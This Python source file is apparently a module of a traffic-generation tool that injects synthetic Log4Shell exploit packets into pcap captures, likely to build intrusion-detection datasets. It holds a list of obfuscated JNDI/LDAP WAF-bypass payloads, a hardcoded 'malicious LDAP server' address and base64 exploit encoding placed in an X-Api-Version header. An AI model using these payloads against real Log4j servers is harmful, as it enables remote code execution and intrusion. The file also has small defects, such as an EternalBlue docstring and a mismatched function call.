import logging
import random as rnd

from scapy.all import *
import lea
import scapy.layers.inet as inet
import scapy.utils
import Attack.BaseAttack as BaseAttack
import base64
import Lib.Utility as Util
from Attack.Parameter import Parameter, Float, IPAddress, MACAddress, Port, String, Boolean
import re
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
load_layer("http")

class Log4ShellAttack(BaseAttack.BaseAttack):
    PORT_SOURCE = 'port.src'
    PORT_DESTINATION = 'port.dst'
    LDAP_SERVER = 'ldap.server.ip'
    DNS_SERVER = 'dns.server.ip'   
    BASE64_OBFS = 'base64'
    CUSTOM_PAYLOAD = 'custom.payload'

    ldap_bypass_payloads = [
                    "${j${k8s:k5:-ND}i:ldap://{{callback_host}}/{{exploit_placeholder}}}",
                    "${j${k8s:k5:-ND}i:ldap${sd:k5:-:}//{{callback_host}}/{{exploit_placeholder}}}",
                    "${j${k8s:k5:-ND}i${sd:k5:-:}ldap://{{callback_host}}/{{exploit_placeholder}}}",
                    "${j${k8s:k5:-ND}i${sd:k5:-:}ldap${sd:k5:-:}//{{callback_host}}/{{exploit_placeholder}}}",
                    "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}ldap://{{callback_host}}/{{exploit_placeholder}}}",
                    "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}ldap{sd:k5:-:}//{{callback_host}}/{{exploit_placeholder}}}",
                    "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}l${lower:D}ap${sd:k5:-:}//{{callback_host}}/{{exploit_placeholder}}}",
                    "${j${k8s:k5:-ND}i${sd:k5:-:}${lower:L}dap${sd:k5:-:}//{{callback_host}}/{{exploit_placeholder}}",
                    "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}l${lower:D}a${::-p}${sd:k5:-:}//{{callback_host}}/{{exploit_placeholder}}}",
                    "${jndi:${lower:l}${lower:d}a${lower:p}://{{callback_host}}/{{exploit_placeholder}}}", 
                    "${jnd${upper:i}:ldap://{{callback_host}}/{{exploit_placeholder}}}",
                    "${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://{{callback_host}}/{{exploit_placeholder}}}"
                    ]
    ATTACKER_IP = '172.17.0.1' 
    VICTIM_IP = '172.17.0.2'
    LDAP_SERVER_IP = '113.15.107.192' #malicious LDAP server 
    DNS_SERVER_IP = '8.8.8.8'      # GOOGLE DNS SERVER
    CALL_BACK_EXPLOIT = "nslookup dtu.dk;"
    template_attack_pcap_path = Util.RESOURCE_DIR + "Log4Shell_exploit.pcap"

    def __init__(self):
        """
        Creates a new instance of the EternalBlue Exploit.
        """
        # Initialize attack
        super(Log4ShellAttack, self).__init__("Log4Shell Exploit", "Injects a Log4Shell exploit'",
                                                 "Privilege elevation")

        self.pkt_num = 0
        self.path_attack_pcap = None

        # Define allowed parameters and their type
        self.update_params([
            Parameter(self.MAC_SOURCE, MACAddress()),
            Parameter(self.IP_SOURCE, IPAddress()),
            Parameter(self.PORT_SOURCE, Port()),
            Parameter(self.MAC_DESTINATION, MACAddress()),
            Parameter(self.IP_DESTINATION, IPAddress()),
            Parameter(self.PORT_DESTINATION, Port()),   
            Parameter(self.LDAP_SERVER, String()),
            Parameter(self.DNS_SERVER, String()),
            Parameter(self.BASE64_OBFS, Boolean()), 
            Parameter(self.PACKETS_PER_SECOND, Float())
        ])

    def init_param(self, param: str) -> bool:
        """
        Initialize a parameter with a default value specified in the specific attack.

        :param param: parameter, which should be initialized
        :return: True if initialization was successful, False if not
        """
        value = None
        # Victim configuration
        if param == self.IP_DESTINATION:
            value = self.statistics.get_most_used_ip_address()
        elif param == self.MAC_DESTINATION:
            ip_dst = self.get_param_value(self.IP_DESTINATION)
            if not ip_dst:
                return False
            value = self.get_mac_address(ip_dst)
        # Attacker configuration
        elif param == self.IP_SOURCE:
            ip_dst = self.get_param_value(self.IP_DESTINATION)
            if not ip_dst:
                return False
            value = self.statistics.get_random_ip_address(ips=[ip_dst])
        elif param == self.MAC_SOURCE:
            ip_src = self.get_param_value(self.IP_SOURCE)
            if not ip_src:
                return False
            value = self.get_mac_address(ip_src)
        elif param == self.PORT_SOURCE:
            value = self.get_unique_random_ephemeral_port()
        elif param == self.PORT_DESTINATION:
            value = 80
        # Attack configuration
        elif param == self.PACKETS_PER_SECOND:
            value = self.statistics.get_most_used_pps()
        elif param == self.INJECT_AFTER_PACKET:
            value = rnd.randint(0, self.statistics.get_packet_count())
        elif param == self.LDAP_SERVER:
            value = self.LDAP_SERVER_IP
        elif param == self.DNS_SERVER:
            value = self.DNS_SERVER_IP
        elif param == self.BASE64_OBFS:
            value = False
        elif param == self.CUSTOM_PAYLOAD:
            value = None
        if value is None:
            return False
        return self.add_param_value(param, value)

    def generate_attack_packets(self):
        """ 
        Creates the attack packets.
        """
     
        # Timestamp
        timestamp_next_pkt = self.get_param_value(self.INJECT_AT_TIMESTAMP)
     
        # Initialize parameters
        mac_source = self.get_param_value(self.MAC_SOURCE)
        ip_source = self.get_param_value(self.IP_SOURCE)
        port_source = self.get_param_value(self.PORT_SOURCE)
        mac_destination = self.get_param_value(self.MAC_DESTINATION)
        ip_destination = self.get_param_value(self.IP_DESTINATION)
        port_destination = self.get_param_value(self.PORT_DESTINATION)
        custom_payload = self.get_param_value(self.CUSTOM_PAYLOAD)
        ldap_server_ip = self.get_param_value(self.LDAP_SERVER)
        dns_server_ip = self.get_param_value(self.DNS_SERVER)

        base64_obsfucation = self.get_param_value(self.BASE64_OBFS)

        # LDAP values    
        ldap_mac =  self.generate_random_mac_address()  
        ldap_server_ip = self.get_param_value(self.LDAP_SERVER) 
        victim_ldap_ep_port = self.get_unique_random_ephemeral_port()
            
        # DNS MAC  
        dns_mac = self.generate_random_mac_address()
        dns_server_ip = self.get_param_value(self.DNS_SERVER)
        victim_dns_ep_port = self.get_unique_random_ephemeral_port()
        
        # call back host
        callback_host = f"{ldap_server_ip}:1389"
    
        self.ip_src_dst_catch_equal(ip_source, ip_destination)

        source_ttl_dist = self.statistics.get_ttl_distribution(ip_source)
        if len(source_ttl_dist) > 0:
            source_ttl_prob_dict = lea.Lea.fromValFreqsDict(source_ttl_dist)
            source_ttl_value = source_ttl_prob_dict.random()
        else:
            source_ttl_value = Util.handle_most_used_outputs(self.statistics.get_most_used_ttl_value())

        destination_ttl_dist = self.statistics.get_ttl_distribution(ip_destination)
        if len(destination_ttl_dist) > 0:
            destination_ttl_prob_dict = lea.Lea.fromValFreqsDict(destination_ttl_dist)
            destination_ttl_value = destination_ttl_prob_dict.random()
        else:
            destination_ttl_value = Util.handle_most_used_outputs(
                self.statistics.get_most_used_ttl_value())
        # Set Window Size based on Window Size distribution of IP address
        source_win_dist = self.statistics.get_win_distribution(ip_source)
        if len(source_win_dist) > 0:
            source_win_prob_dict = lea.Lea.fromValFreqsDict(source_win_dist)
        else:
            source_win_dist = self.statistics.get_win_distribution(self.statistics.get_most_used_ip_address())
            source_win_prob_dict = lea.Lea.fromValFreqsDict(source_win_dist)

        destination_win_dist = self.statistics.get_win_distribution(ip_destination)
        if len(destination_win_dist) > 0:
            destination_win_prob_dict = lea.Lea.fromValFreqsDict(destination_win_dist)
        else:
            destination_win_dist = self.statistics.get_win_distribution(self.statistics.get_most_used_ip_address())
            destination_win_prob_dict = lea.Lea.fromValFreqsDict(destination_win_dist)
        
        # Set MSS (Maximum Segment Size) based on MSS distribution of IP address
        mss_value = Util.handle_most_used_outputs(self.statistics.get_most_used_mss_value())
        if not mss_value:
            mss_value = 1465
        

        # Inject exploit pcap
        arrival_time = 0
        exploit_raw_packets = scapy.utils.RawPcapReader(self.template_attack_pcap_path)
        inter_arrival_times = self.get_inter_arrival_time(exploit_raw_packets)
        exploit_raw_packets.close()
        exploit_raw_packets = scapy.utils.RawPcapReader(self.template_attack_pcap_path)
        source_origin_wins, destination_origin_wins = {}, {}
        # Dictionary to store payload length difference for each conversation -> done to update the SEQ, ACK for when TCP payload is changed. 
        track_ephermal_ports_tcp_payload_diff = {}


        for self.pkt_num, pkt in enumerate(exploit_raw_packets):
            eth_frame = inet.Ether(pkt[0])
            ip_pkt = eth_frame.payload       
            tcp_pkt = ip_pkt.payload      
            http_pkt = tcp_pkt.payload
            arrival_time = arrival_time + inter_arrival_times[self.pkt_num]
            
            # Request (ATTACKER -> VICTIM)
            if ip_pkt.getfieldval("src") == self.ATTACKER_IP: 
                # Ether
                eth_frame.setfieldval("src", mac_source)
                eth_frame.setfieldval("dst", mac_destination)
                # IP
                ip_pkt.setfieldval("src", ip_source)
                ip_pkt.setfieldval("dst", ip_destination)
                ip_pkt.setfieldval("ttl", source_ttl_value)
                # TCP
                tcp_pkt.setfieldval("sport", port_source)
                ip_pkt.setfieldval("dport", port_destination)
                
                # Window Size (mapping)
                source_origin_win = tcp_pkt.getfieldval("window")
                if source_origin_win not in source_origin_wins:
                    while True:
                        source_win_rand_pick = source_win_prob_dict.random()
                        if source_win_rand_pick != 0:
                                break
                    source_origin_wins[source_origin_win] = source_win_rand_pick
                new_win = source_origin_wins[source_origin_win]
                tcp_pkt.setfieldval("window", new_win)

                # MSS
                tcp_options = tcp_pkt.getfieldval("options")
                if tcp_options:
                    if tcp_options[0][0] == "MSS":
                        tcp_options[0] = ("MSS", mss_value)
                        tcp_pkt.setfieldval("options", tcp_options)

                
                if tcp_pkt.getfieldval("sport") in track_ephermal_ports_tcp_payload_diff: # Update packet details  
                    self.update_seq_ack(ip_pkt,track_ephermal_ports_tcp_payload_diff[tcp_pkt.getfieldval("sport")],True)
                else: # Initialse tracking 
                    track_ephermal_ports_tcp_payload_diff[tcp_pkt.getfieldval("sport")] = 0 # set to 0 initially 

                if http_pkt: # Only 1 http request is sent to that victim 

                    x_api_exploit_injection = None
                    if custom_payload is not None:
                       x_api_exploit_injection  = self.inject_custom_payload(custom_payload)
                
                    if x_api_exploit_injection is None:  
                        x_api_exploit_injection = self.generate_waf_bypass_payloads(base64_obsfucation, callback_host, self.CALL_BACK_EXPLOIT) 
                  
                    if x_api_exploit_injection is None:
                        raise ValueError("No http header was generated")
                    
                    # update the payload with new and track convo. 
                    track_ephermal_ports_tcp_payload_diff[tcp_pkt.getfieldval("sport")] = self.update_tcp_packet_payload(ip_pkt,x_api_exploit_injection) 

                # generate packet 
                new_pkt = (eth_frame / ip_pkt / tcp_pkt)
                new_pkt.time = timestamp_next_pkt + arrival_time
                timestamp_next_pkt = self.timestamp_controller.next_timestamp()

            
            # LDAP_SERVER OR DNS_SERVER -> VICTIM
            elif ip_pkt.getfieldval("src") == self.DNS_SERVER_IP or ip_pkt.getfieldval("src") == self.LDAP_SERVER_IP:
                # set dst values
                eth_frame.setfieldval("dst", mac_destination)
                ip_pkt.setfieldval("dst", ip_destination)
                ip_pkt.setfieldval("dst", ip_destination)
                if ip_pkt.getfieldval("src") == self.DNS_SERVER_IP:
                    eth_frame.setfieldval("src", dns_mac)
                    ip_pkt.setfieldval("src", dns_server_ip)   
                    tcp_pkt.setfieldval("dport", victim_dns_ep_port) 
                
                else: 
                    eth_frame.setfieldval("src", ldap_mac)
                    ip_pkt.setfieldval("src", ldap_server_ip)   
                    tcp_pkt.setfieldval("dport", victim_ldap_ep_port) 

                # Generate packet 
                new_pkt = (eth_frame / ip_pkt / tcp_pkt)
                new_pkt.time = timestamp_next_pkt + arrival_time
                timestamp_next_pkt = self.timestamp_controller.next_timestamp()




            # Reply (VICTIM -> ATTACKER OR LDAP_SERVER OR DNS)
            elif ip_pkt.getfieldval("src")  == self.VICTIM_IP:
                # set sources 
                eth_frame.setfieldval("src", mac_destination)
                ip_pkt.setfieldval("src", ip_destination)
                ip_pkt.setfieldval("ttl", destination_ttl_value)

                if ip_pkt.getfieldval("dst") == self.DNS_SERVER_IP:
                    # set src 
                    tcp_pkt.setfieldval("sport", victim_dns_ep_port) 
                    # set dst 
                    eth_frame.setfieldval("dst", dns_mac)
                    ip_pkt.setfieldval("dst", dns_server_ip) 
                
                elif ip_pkt.getfieldval("dst") == self.LDAP_SERVER_IP:
                    # set src 
                    tcp_pkt.setfieldval("sport", victim_ldap_ep_port) 
                    # set dst 
                    eth_frame.setfieldval("dst", ldap_mac)
                    ip_pkt.setfieldval("dst", ldap_server_ip)   

                elif ip_pkt.getfieldval("dst") == self.ATTACKER_IP:
                    # set src 
                    tcp_pkt.setfieldval("sport", port_destination)
                    # set dst 
                    eth_frame.setfieldval("dst", mac_source)
                    ip_pkt.setfieldval("dst", ip_source)
                    tcp_pkt.setfieldval("dport", port_source) 

                    if tcp_pkt.getfieldval("dport") in track_ephermal_ports_tcp_payload_diff: 
                        self.update_seq_ack(ip_pkt,track_ephermal_ports_tcp_payload_diff[tcp_pkt.getfieldval("dport")],False)

                    # Window Size
                    destination_origin_win = tcp_pkt.getfieldval("window")
                    if destination_origin_win not in destination_origin_wins:
                        while True:
                            destination_win_rand_pick = destination_win_prob_dict.random()
                            if destination_win_rand_pick != 0:
                                break
                        destination_origin_wins[destination_origin_win] = destination_win_rand_pick
                    new_win = destination_origin_wins[destination_origin_win]
                    tcp_pkt.setfieldval("window", new_win)

                    # MSS
                    tcp_options = tcp_pkt.getfieldval("options")
                    if tcp_options:
                        if tcp_options[0][0] == "MSS":
                            tcp_options[0] = ("MSS", mss_value)
                            tcp_pkt.setfieldval("options", tcp_options)

                # Generate packet 
                new_pkt = (eth_frame / ip_pkt / tcp_pkt)
                new_pkt.time = timestamp_next_pkt + arrival_time
                timestamp_next_pkt = self.timestamp_controller.next_timestamp()

            self.add_packet(new_pkt, ip_source, ip_destination)

        exploit_raw_packets.close()


    def update_tcp_packet_payload(self, ip_pkt, x_api_version_injection):
        """
        This function updates the TCP packet payload (HTTP) 'X-Api-Version' header.
        It replaces the 'X-Api-Version' header with the provided 'X-Api-Version' header and recalculates
        the IP and TCP checksums if the payload length has changed.
        NOTE: 
            Function does not check if the provided tcp payload is an instance of HTTP. 
        Args:
            ip_pkt (scapy.layers.inet.IP): The IP packet containing the TCP packet.
            http_pkt (scapy.layers.http.HTTP): The HTTP packet with the payload to be updated.
            user_agent_injection (str): The custom X-Api-Version header to be injected.
        Returns:
            int: The difference in payload length after the update.
        """
        http_pkt = ip_pkt.payload.payload
        load = http_pkt[Raw].load.decode()
        new_load = re.sub(r"X-Api-Version:.*\r\n", x_api_version_injection, load)
        http_pkt[Raw].load = new_load
        tcp_payload_len_diff = len(new_load) - len(load)
        # Recalculate the IP len as well as IP and TCP checksums if the payload length has changed
        if tcp_payload_len_diff != 0:
           self.update_ip_packet_len_and_checksums(ip_pkt)
        return tcp_payload_len_diff
        



    def generate_waf_bypass_payloads(self,base64_obsfucation,callback_host ,exploit):
        """
        Generates a WAF bypass payload by updating the callback host and exploit in a randomly
        chosen payload from the 'ldap_bypass_payloads' list. The exploit can be optionally base64 obfuscated.

        Args:
            base64_obsfucation (bool): If True, base64 obfuscates the exploit before including it in the payload.
            callback_host (str): The host to be used as the callback destination.
            exploit (str): The exploit code to be included in the payload.

        Returns:
            str: The generated WAF bypass payload with the updated callback host and exploit.
        """
        payload = random.choice(self.ldap_bypass_payloads)
        new_payload = payload.replace("{{callback_host}}", callback_host) # update call back host
        if(base64_obsfucation):
            new_payload = new_payload.replace("{{exploit_placeholder}}", self.base_64_obsfucate(exploit))
        else:     
            new_payload = new_payload.replace("{{exploit_placeholder}}", exploit)
        new_payload = "X-Api-Version: " + new_payload + "\r\n" # add rest of header
        return new_payload
    
    def base_64_obsfucate(self,exploit):
        """
        Base 64 encodes the exploit & returns it with appopriate command.  
        """
        return '/Basic/Command/Base64/' + base64.b64encode(exploit.encode()).decode()
    
    def inject_custom_payload(self,base64_obsfucation, custom_payload):
        """
        This function injects a custom payload into an existing payload if the custom payload matches
        the specified regex pattern. The custom payload should be in the form of 'X-Api-Version:(.*?)'.
        
        Args:
            custom_payload (str): The custom payload to be injected.
                Example: "X-Api-Version:Custom-value"

        Returns:
            str: The modified payload with the custom payload injected, if it matches the regex pattern.
            None: If the custom payload does not match the regex pattern.
        """
        user = re.compile("X-Api-Version:(.*?)") # Detect X-Api-Version: in custom-exploit
        custom_injection = user.fullmatch(custom_payload)
        if not custom_injection:
            print("WARNING: Ignored custom payload since it must be of regex form 'X-Api-Version:(.*?)' ")
            return None
        if base64_obsfucation:
            print("WARNING: Ignored custom payload since we do not support BASE64 encoding of custom exploit ")
            return None
        return custom_injection.string + "\r\n"  # add rest of header

    
    def generate_attack_pcap(self):
        """
        Creates a pcap containing the attack packets.

        :return: The location of the generated pcap file.
        """

        # Store timestamp of first packet (for attack label)
        self.attack_start_utime = self.packets[0].time
        self.attack_end_utime = self.packets[-1].time

        if len(self.packets) > 0:
            self.packets = sorted(self.packets, key=lambda pkt: pkt.time)
            self.path_attack_pcap = self.write_attack_pcap(self.packets, True, self.path_attack_pcap)

        # return self.packets sorted by packet time_sec_start
        # pkt_num+1: because pkt_num starts at 0
        return self.pkt_num + 1, self.path_attack_pcap
